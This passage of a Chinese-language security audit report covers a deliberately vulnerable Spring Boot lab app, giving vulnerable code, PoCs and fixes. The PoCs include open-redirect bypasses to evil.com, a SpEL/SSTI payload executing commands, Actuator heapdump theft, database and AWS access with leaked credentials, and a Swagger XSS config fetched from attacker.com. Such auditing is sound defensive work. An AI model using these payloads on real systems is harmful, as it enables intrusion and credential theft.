public String vul2(String url) {
    String domain = "ffffffff0x.com";
    int result = url.indexOf(domain);  // 只要 URL 包含该字符串即通过
    if(result != -1){
        return "redirect:" + url;
    }
    return "redirect:/error";
}
```

#### 漏洞利用 PoC

```bash
# 将白名单域名放在路径中
http://127.0.0.1:8999/redirect/2?url=http://evil.com/ffffffff0x.com

# 放在查询参数中
http://127.0.0.1:8999/redirect/2?url=http://evil.com/?next=ffffffff0x.com

# 放在子域名中（让 ffffffff0x.com 成为子串）
http://127.0.0.1:8999/redirect/2?url=http://attackerffffffff0x.com/
```

#### 修复方案

解析 URL 的 host 后进行完整域名比对（而非包含检测）：

```java
String host = new URL(url).getHost().toLowerCase();
// 精确匹配或后缀匹配
if (host.equals("ffffffff0x.com") || host.endsWith(".ffffffff0x.com")) {
    return "redirect:" + url;
}
```

---

### VUL-12：开放重定向（反斜杠 `%5C` 绕过）

**危险等级**：🟡 中危

#### 漏洞描述

`/redirect/3` 使用 `new URL(url).getHost()` 获取 host 并校验其是否以 `.ffffffff0x.com` 结尾。但 Java 的 `URL` 类对 URL 编码的反斜杠 `%5C` 的解析行为与浏览器（Chrome/IE）不一致，导致攻击者可以构造 Java 认为 host 是 `www.baidu.com`、但浏览器实际跳转到 `www.evil.com` 的 URL。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/Redirect.java:44-61`

#### 漏洞代码

```java
// Redirect.java:44-61
@GetMapping("/3")
public String vul3(String url) {
    String host = "";
    try {
        host = new URL(url).getHost();  // Java URL 对 %5C 的解析与浏览器不一致
    } catch (MalformedURLException e) { e.printStackTrace(); }

    if (host.endsWith(".ffffffff0x.com")){
        return "redirect:https://" + host;
    }
    return "redirect:/error";
}
```

#### 漏洞利用 PoC

```bash
# Java URL.getHost() 解析 %5C 时认为 host 是 "www.baidu.com"（通过校验）
# 但浏览器将 %5C 当路径分隔符，实际访问 www.evil.com
http://127.0.0.1:8999/redirect/3?url=http://www.baidu.com%5Cwww.evil.com

# 利用 # 符号（Java URL 认为 host 是 home.ffffffff0x.com，浏览器跳转到 evil.com）
http://127.0.0.1:8999/redirect/3?url=https://home.ffffffff0x.com#@evil.com
```

#### 修复方案

对 `url` 中的特殊字符（`\`、`#`）进行规范化后再解析（参考 `Redirect.safe` 实现）：

```java
// 安全案例（Redirect.java:safe 已正确实现）
url = url.replaceAll("[\\\\#]", "/");
host = new URL(url).getHost();
```

---

### VUL-22：SpEL 结果作为视图名触发链式 SSTI

**危险等级**：🟡 中危

#### 漏洞描述

`SpEL.java` 声明为 `@Controller`（而非 `@RestController`），且方法没有 `@ResponseBody` 注解。在 Spring MVC 中，`@Controller` 方法返回的字符串会被 `ViewResolver` 当作模板路径解析。SpEL 表达式求值的结果字符串会再次经过 Thymeleaf 解析，若结果包含 Thymeleaf 预处理语法，则触发二次 SSTI。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/SpEL.java:20-21`

#### 漏洞代码

```java
// SpEL.java:20-21
@Api(tags = "SpEL注入")
@Slf4j
@Controller           // ← 应为 @RestController；此处缺少 @ResponseBody
public class SpEL {

    @GetMapping("/spel")
    public String vul1(String exec) {
        ExpressionParser parser = new SpelExpressionParser();
        EvaluationContext evaluationContext = new StandardEvaluationContext();

        String result = parser.parseExpression(exec)
                              .getValue(evaluationContext)
                              .toString();
        log.info(exec);
        return result;  // ← result 被 Thymeleaf ViewResolver 二次解析为模板路径
    }
}
```

#### 漏洞利用 PoC

（在 VUL-04 已可直接 RCE 的前提下，此漏洞提供了另一条攻击链）

**构造 SpEL 表达式，使其返回值本身是一个 Thymeleaf SSTI payload：**
```
GET /spel?exec='__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x'
```

SpEL 求值结果为字符串 `__${...}__::.x`，此字符串被 Thymeleaf 作为视图名解析，触发 SSTI。

#### 修复方案

添加 `@ResponseBody` 注解，使返回值直接输出为响应体而非视图名：

```java
// 修复后：添加 @ResponseBody，或改为 @RestController
@GetMapping("/spel")
@ResponseBody          // ← 添加此注解
public String vul1(String exec) { ... }
```

---

### VUL-13：SQL 过滤函数（`checkSql`）完全失效

**危险等级**：🟡 中危

#### 漏洞描述

`Security.checkSql()` 意图通过黑名单拦截 SQL 注入关键词，但因 `String.split("|")` 中 `|` 在 Java 正则中是 OR 运算符，等价于 `split("")`（按每个字符分割），导致黑名单字符串被拆成单个字符数组，关键词无法正确匹配，过滤函数形同虚设。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/util/Security.java:69-78`

#### 漏洞代码

```java
// Security.java:69-78
public static boolean checkSql(String content) {
    String black = "'|;|--|+|,|%|=|>|<|*|(|)|and|or|exec|insert|select|delete|update|count|drop|chr|mid|master|truncate|char|declare";

    // BUG: "|" 是正则元字符，split("|") 等价于 split("")，按单个字符分割
    // 导致 black_list = ["'", "|", ";", "|", "-", "-", "|", ...]（全是单字符）
    // "and"、"select" 等多字符关键词永远匹配不到
    String[] black_list = black.split("|");

    for (int i = 0; i < black_list.length; i++) {
        if (content.contains(black_list[i])) {  // 只会检查单个字符
            return true;
        }
    }
    return false;
}
```

#### 漏洞利用 PoC

```java
// 验证该函数对 "select" 的检测结果（应为 true，实际返回 false）
System.out.println(Security.checkSql("select * from user"));
// 输出: false  ← 过滤函数无效

// 由于 "|" 本身是 black_list 的元素之一，下面会返回 true（但这是误判）
System.out.println(Security.checkSql("1|2"));  // 因为 "|" 在 black_list 中
```

#### 修复方案

转义正则元字符，使 `|` 作为字面量分隔符：

```java
// 修复后：使用 "\\|" 或 Pattern.quote("|")
String[] black_list = black.split("\\|");

// 或更安全：使用 Set 存储关键词，用 contains 检测
// 但根本修复应使用参数化查询，不应依赖关键词过滤
```

---

### VUL-14：Spring Actuator 全端点暴露

**危险等级**：🟡 中危

#### 漏洞描述

配置文件将 Spring Actuator 的所有管理端点对外暴露且无认证保护，攻击者可访问 `/actuator/env` 获取所有环境变量和配置（含数据库密码）、`/actuator/heapdump` 下载 JVM 堆内存转储（可能含敏感数据）、`/actuator/mappings` 获取所有路由信息等。

#### 漏洞位置

- `src/main/resources/application-dev.properties:61-62`

#### 漏洞代码

```properties
# application-dev.properties:61-62
management.endpoints.web.exposure.include=*   # 暴露全部端点
management.endpoints.jmx.exposure.include=*
```

#### 漏洞利用 PoC

```bash
# 获取所有暴露的端点列表
curl http://127.0.0.1:8999/actuator

# 获取环境变量（含数据库密码等敏感信息）
curl http://127.0.0.1:8999/actuator/env

# 下载 JVM 堆转储（可用 jhat/MAT 分析内存中的明文密码、Session Token 等）
curl -O http://127.0.0.1:8999/actuator/heapdump
# 分析堆转储
jhat heapdump

# 查看所有路由映射（信息收集）
curl http://127.0.0.1:8999/actuator/mappings

# 查看 Prometheus 指标（系统信息泄露）
curl http://127.0.0.1:8999/actuator/prometheus

# 结合 Spring Cloud（若存在），通过 /actuator/env POST 修改配置实现 RCE
curl -X POST http://127.0.0.1:8999/actuator/env \
     -H 'Content-Type: application/json' \
     -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:test..."}'
```

#### 修复方案

```properties
# 修复后：只暴露必要的健康检查端点，并添加认证
management.endpoints.web.exposure.include=health,info
management.endpoint.health.show-details=when-authorized

# 配合 Spring Security 添加 Actuator 认证
# spring.security.user.name=actuator
# spring.security.user.password=<strong-password>
```

---

### VUL-15：Druid 监控控制台弱口令且无 IP 限制

**危险等级**：🟡 中危

#### 漏洞描述

Druid 连接池监控控制台使用默认弱口令 `admin/admin`，且 `allow` 配置为空（允许所有 IP 访问），任意用户均可登录并查看所有 SQL 执行记录、慢查询、数据源配置（含明文密码）等敏感信息。

#### 漏洞位置

- `src/main/resources/application-dev.properties:54-59`

#### 漏洞代码

```properties
# application-dev.properties:54-59
spring.datasource.druid.stat-view-servlet.enabled=true
spring.datasource.druid.stat-view-servlet.url-pattern=/druid/*
spring.datasource.druid.stat-view-servlet.reset-enable=true
spring.datasource.druid.stat-view-servlet.login-username=admin   # 弱口令
spring.datasource.druid.stat-view-servlet.login-password=admin   # 弱口令
spring.datasource.druid.stat-view-servlet.allow=                 # 为空 = 允许所有 IP
```

#### 漏洞利用 PoC

```bash
# 直接访问登录页
open http://127.0.0.1:8999/druid/login.html
# 用户名: admin  密码: admin

# 登录后可访问：
# /druid/sql.html  - 所有 SQL 记录（可能含敏感数据查询）
# /druid/datasource.html - 数据源配置（含数据库密码）
# /druid/wall.html - 防火墙统计
```

#### 修复方案

```properties
# 修复后：强口令 + 限制访问 IP
spring.datasource.druid.stat-view-servlet.login-username=druid_admin
spring.datasource.druid.stat-view-servlet.login-password=<随机强密码>
spring.datasource.druid.stat-view-servlet.allow=127.0.0.1      # 仅允许本地访问
spring.datasource.druid.stat-view-servlet.reset-enable=false    # 禁止数据重置
# 生产环境建议直接禁用：
# spring.datasource.druid.stat-view-servlet.enabled=false
```

---

### VUL-16：数据库凭据硬编码

**危险等级**：🟡 中危

#### 漏洞描述

MySQL（root 用户）和 PostgreSQL 的连接凭据以明文形式硬编码在配置文件中，且配置文件纳入版本控制。一旦代码仓库泄露或被未授权访问，攻击者可直接连接数据库。

#### 漏洞位置

- `src/main/resources/application-dev.properties:21-29`

#### 漏洞代码

```properties
# application-dev.properties:21-29
spring.datasource.druid.primary.jdbc-url=jdbc:mysql://10.211.55.3:3306/test
spring.datasource.druid.primary.username=root          # 使用 root 账户
spring.datasource.druid.primary.password=ffffffff0x    # 明文密码

spring.datasource.druid.secondary.jdbc-url=jdbc:postgresql://10.211.55.3:5432/test
spring.datasource.druid.secondary.username=postgres
spring.datasource.druid.secondary.password=ffffffff0x  # 明文密码
```

#### 漏洞利用 PoC

```bash
# 获取到配置文件后（通过代码仓库泄露或 Actuator env 接口）直接连接数据库
mysql -h 10.211.55.3 -u root -pffffffff0x test -e "show tables;"
psql postgresql://postgres:ffffffff0x@10.211.55.3:5432/test -c "\dt"
```

#### 修复方案

```properties
# 修复后：使用环境变量引用，不在配置文件中写入实际值
spring.datasource.druid.primary.username=${DB_PRIMARY_USER}
spring.datasource.druid.primary.password=${DB_PRIMARY_PASS}
```

```bash
# 在部署环境中通过环境变量注入
export DB_PRIMARY_USER=app_user
export DB_PRIMARY_PASS=$(vault kv get -field=password secret/db/primary)
```

---

### VUL-17：云凭据（AK/SK）信息泄露

**危险等级**：🟡 中危

#### 漏洞描述

`/infoleak/aksk` 页面无需任何认证即可访问，页面内包含腾讯云 SecretId/SecretKey、阿里云 AccessKey ID/Secret 以及 AWS Access Key ID/Secret Access Key，任意用户可直接获取。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/InfoLeak.java:19-22`
- `src/main/resources/templates/aksk.html`

#### 漏洞代码

```java
// InfoLeak.java:19-22 - 无认证保护
@GetMapping("/infoleak/aksk")
public String akskPage() {
    return "aksk";  // 直接返回含云凭据的页面
}
```

```html
<!-- aksk.html - 明文暴露云凭据 -->
SecretId : AKIDf9NL2Rxx1LNxxqmSr0sxxoZ3XXXGNDxx
SecretKey : GI3XkgMlsiIabLxxvZw3sxxhQx6XXXxx
AccessKey ID : LTAI5XLxTxxxxdcTXXExxxxx
AWS Access Key ID: AKIAUXXXXXFYXNIXXXXX
```

#### 漏洞利用 PoC

```bash
# 直接访问获取凭据
curl http://127.0.0.1:8999/infoleak/aksk

# 使用获取到的凭据访问云服务（以 AWS 为例）
aws configure set aws_access_key_id AKIAUXXXXXFYXNIXXXXX
aws configure set aws_secret_access_key "x/Wigo+RW4xE..."
aws iam get-user           # 确认身份
aws s3 ls                  # 列举 S3 存储桶
aws ec2 describe-instances # 列举 EC2 实例
```

#### 修复方案

立即删除该页面或添加强认证保护；同时**立即轮换**所有已泄露的云凭据：
```java
// 修复后：移除公开访问或添加权限校验
@GetMapping("/infoleak/aksk")
@PreAuthorize("hasRole('ADMIN')")  // 需要管理员角色
public String akskPage() { return "aksk"; }
```

---

### VUL-18：IP 伪造（信任可控请求头）

**危险等级**：🔵 低危

#### 漏洞描述

`/ipinfo/xxf` 端点直接读取并返回 `X-Real-IP` 和 `X-Forwarded-For` 请求头，这两个头可由客户端任意伪造。若应用基于这些头做 IP 白名单或访问控制决策，攻击者可伪造 IP 绕过限制。

#### 漏洞位置

- `src/main/java/com/ffffffff0x/exploit/IPInfo.java:25-30`

#### 漏洞代码

```java
// IPInfo.java:25-30
@GetMapping("/xxf")
public static String xxf(HttpServletRequest request) {
    String ip1 = request.getHeader("X-Real-IP");       // 客户端可任意伪造
    String ip2 = request.getHeader("X-Forwarded-For"); // 客户端可任意伪造
    return "X-Real-IP: " + ip1 + " X-Forwarded-For: " + ip2;
}
```

#### 漏洞利用 PoC

```bash
# 伪造 IP 地址
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 10.0.0.1" \
     http://127.0.0.1:8999/ipinfo/xxf

# 若系统基于 XFF 做 IP 白名单，可伪造为内网 IP 绕过
curl -H "X-Forwarded-For: 192.168.1.100" \
     http://127.0.0.1:8999/ipinfo/xxf
```

#### 修复方案

只信任由可信反向代理（Nginx/LB）设置的头，并在 Nginx 层面覆盖该头（禁止客户端传入）；业务逻辑中使用 `getRemoteAddr()` 获取真实连接 IP：

```nginx
# Nginx 配置：强制覆盖 X-Forwarded-For，防止客户端伪造
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
```

---

### VUL-19：Swagger UI XSS（configUrl 参数）

**危险等级**：🔵 低危

#### 漏洞描述

旧版本 Swagger UI（项目使用 `swagger-spring-boot-starter:1.9.0.RELEASE`）在处理 `configUrl` 查询参数时存在 XSS 漏洞，攻击者可构造恶意链接，诱使管理员点击后在其浏览器中执行任意 JavaScript。

#### 漏洞位置

- `src/main/resources/application-dev.properties:4-5`（注释标注）

#### 漏洞代码

```properties
# application-dev.properties:4-5
# swagger-ui xss
# http://127.0.0.1:8999/swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json
```

#### 漏洞利用 PoC

```
# 攻击链接（诱使管理员点击）：
http://127.0.0.1:8999/swagger-ui.html?configUrl=https://attacker.com/malicious-swagger.json

# 恶意 JSON 文件内容（attacker.com/malicious-swagger.json）：
{
  "urls": [{"url": "javascript:alert(document.cookie)", "name": "XSS"}]
}
```

#### 修复方案

升级 Swagger UI 至修复版本，或禁用 Swagger 在生产环境的访问：

```java
// 通过 Profile 限制 Swagger 仅在开发环境启用
@Profile("dev")
@Configuration
public class SwaggerConfig { ... }
```

---

## 修复优先级建议

### 第一优先级：立即修复（严重，可直接 RCE）

| 编号 | 漏洞 | 修复要点 |
|------|------|----------|
| VUL-20 | Log4Shell | 升级 Spring Boot ≥ 2.7.18，或强制 `log4j2.version=2.17.1` |
| VUL-04 | SpEL 注入 | 改用 `SimpleEvaluationContext`；添加 `@ResponseBody`（修复 VUL-22） |
| VUL-01 | SQL 注入 | 所有 `${id}` 改为 `#{id}` |
| VUL-02 | SSTI（预处理） | 移除模板中的 `__${变量}__` 语法 |
| VUL-03 | SSTI（视图名） | 白名单校验 `name` 参数 |

### 第二优先级：尽快修复（高危，可读取任意文件/内网探测）

| 编号 | 漏洞 | 修复要点 |
|------|------|----------|
| VUL-05 | SSRF（无过滤） | 使用 `HTTPURLConnection` + 协议白名单 + 内网黑名单 |
| VUL-06 | SSRF（重定向绕过） | 禁止跟随重定向 `setInstanceFollowRedirects(false)` |
| VUL-21 | SSRF（正则绕过） | 改用 `InetAddress.isLoopbackAddress()` 等 API 进行检测 |
| VUL-07 | 任意文件上传 | 扩展名白名单 + 随机文件名 + 路径规范化 |
| VUL-08 | 上传黑名单绕过 | 改用扩展名白名单 |
| VUL-09 | 上传路径穿越 | `Paths.get(fileName).getFileName()` 去除路径前缀 |

### 第三优先级：计划修复（中危）

| 编号 | 漏洞 | 修复要点 |
|------|------|----------|
| VUL-10~12 | 开放重定向 | URL host 解析 + 严格域名白名单 + 反斜杠规范化 |
| VUL-13 | checkSql 失效 | `split("\\|")` 转义；根本上应使用参数化查询 |
| VUL-14 | Actuator 暴露 | `include=health,info` + Spring Security 认证 |
| VUL-15 | Druid 弱口令 | 强口令 + `allow=127.0.0.1` |
| VUL-16 | 凭据硬编码 | 改用环境变量或 Vault |
| VUL-17 | AK/SK 泄露 | 立即删除并轮换已泄露凭据；页面添加认证 |

---

*报告生成时间：2026-02-26*
